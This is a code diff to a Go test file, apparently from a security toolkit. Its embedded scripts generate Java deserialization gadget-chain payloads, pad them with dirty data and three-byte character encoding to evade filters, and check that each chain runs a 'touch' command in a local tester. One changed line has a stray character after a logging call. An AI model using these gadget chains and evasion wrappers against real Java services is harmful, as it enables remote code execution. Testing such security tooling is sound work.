@@ -29,7 +29,7 @@ for gadgetName in transformChianGadgets{
 		path = "/tmp/%s" % randomstr
 		gadgetIns = yso.GetGadget(gadgetName,"raw_cmd","touch "+path)~
 		payload1 = yso.ToBytes(gadgetIns)~
-		payload = yso.WarpByDirtyData(payload1,10000)~
+		payload = yso.ToBytes(gadgetIns,yso.threeBytesCharString(),yso.dirtyDataLength(10000))~
 		assert len(payload) - len(payload1) > 10000
 		payloadBase64 = codec.EncodeBase64(payload)~
 		cmd = "/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home/bin/java '-javaagent:/tmp/yak-yso-tester-loader.jar%s' -jar /tmp/yak-yso-tester.jar '%s'"%[extArg,payloadBase64]
@@ -57,17 +57,16 @@ for gadgetName in templateGadgetNames{
 		path = "/tmp/%s" % randomstr
 		gadgetIns = yso.GetGadget(gadgetName,"RuntimeExec","touch "+path)~
 		payload1 = yso.ToBytes(gadgetIns)~
-		payload = yso.WarpByDirtyData(payload1,10000)~
+		payload = yso.ToBytes(gadgetIns,yso.threeBytesCharString(),yso.dirtyDataLength(10000))~
 		assert len(payload) - len(payload1) > 10000
 		payloadBase64 = codec.EncodeBase64(payload)~
 		cmd = "/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home/bin/java '-javaagent:/tmp/yak-yso-tester-loader.jar%s' -jar /tmp/yak-yso-tester.jar '%s'"%[extArg,payloadBase64]
 		exec.System(cmd)
 		if !file.IsExisted(path){
-			dump(cmd)
 			panic("not found file")
 		}
 		file.Remove(path)
-		log.info("gadget %s exec test success",gadgetName)
+		log.info("gadget %s exec test success",gadgetName)a
 	}catch e{
 		log.error("gadget %s exec test failed: %v", gadgetName,e)
 		failedGadgets.Append(gadgetName)
@@ -93,7 +92,7 @@ func TestGadgetBaseExternalJarTool(t *testing.T) {
 const classTestCode = `
 execPayload = (arg...) => {
 	gadgetIns = yso.GetGadget("CommonsBeanutils1",arg...)~
-	payload = yso.ToBytes(gadgetIns)~
+	payload = yso.ToBytes(gadgetIns,yso.threeBytesCharString())~
 	payloadBase64 = codec.EncodeBase64(payload)~
 	cmd = "/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home/bin/java '-javaagent:/tmp/yak-yso-tester-loader.jar' -jar /tmp/yak-yso-tester.jar '%s'"%[payloadBase64]
 	exec.System(cmd)
